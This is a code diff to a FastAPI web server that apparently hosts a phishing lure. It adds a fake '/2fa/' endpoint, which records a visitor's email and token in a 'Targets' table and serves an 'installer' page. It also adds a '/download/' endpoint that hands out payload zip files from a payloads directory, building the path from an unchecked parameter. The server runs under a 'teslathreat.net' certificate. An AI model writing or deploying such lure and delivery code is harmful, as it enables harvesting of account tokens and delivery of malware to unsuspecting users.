@@ -5,15 +5,19 @@ from fastapi.encoders import jsonable_encoder
 from fastapi.responses import JSONResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
+from starlette.responses import FileResponse
+
 from datetime import datetime
+from os.path import exists
 
 from enums import StatusType, MediaType
-from common.datatypes import Fingerprints
+from common.datatypes import Fingerprints, Targets
 from common.database import db_session
 from lambdas import gen_UUID, EncodeAES, DecodeAES, EncodeHeader, DecodeHeader, stamp
 from typing import Optional
 from services.ipapi_service import IPAPIService
 from services.tip_service import TIPService
+from common import config
 
 
 app = FastAPI()
@@ -209,10 +213,54 @@ def objectify(url: str = None, o: str = None, p: str = None, h: str = None):
         return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=404)
 
 
+@app.get("/2fa/")
+async def installer(request: Request, bindAccount: str = None, token: str = None):
+    try:
+        if not bindAccount:
+            raise Exception("Email was not passed by the URL")
+        if not token:
+            raise Exception("Token was not passed by the URL")
+        user_register_email = bindAccount
+        user_register_token = token
+        target_dto = Targets(email=user_register_email, token=user_register_token, first_name="N/a", last_name="N/a")
+        db_session.add(target_dto)
+        db_session.commit()
+        return await task(request, "installer")
+    except Exception:
+        content = {
+            "status": StatusType.FAILED.value,
+            "timestamp": stamp()
+        }
+        json = jsonable_encoder(obj=content)
+        return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=404)
+
+
+@app.get("/download/")
+async def download(binary: str = None):
+    try:
+        filename = f"{binary}.zip"
+        filepath = config.get_payloads(filename)
+        if not exists(filepath):
+            content = {
+                "status": StatusType.PENDING.value,
+                "timestamp": stamp()
+            }
+            json = jsonable_encoder(obj=content)
+            return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=300)
+
+        return FileResponse(path=filepath, media_type=MediaType.APPLICATION_OCTET.value, filename=filename)
+    except Exception:
+        content = {
+            "status": StatusType.FAILED.value,
+            "timestamp": stamp()
+        }
+        json = jsonable_encoder(obj=content)
+        return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=404)
+
+
 if __name__ == '__main__':
     import uvicorn
     import os
-    from common import config
     pem = os.path.join(config.get_root_path(), 'resources', '_.teslathreat.net_private_key.key')
     crt = os.path.join(config.get_root_path(), 'resources', 'teslathreat.net_ssl_certificate.cer')
     uvicorn.run(app, host="0.0.0.0", port=8443, ssl_certfile=crt, ssl_keyfile=pem)
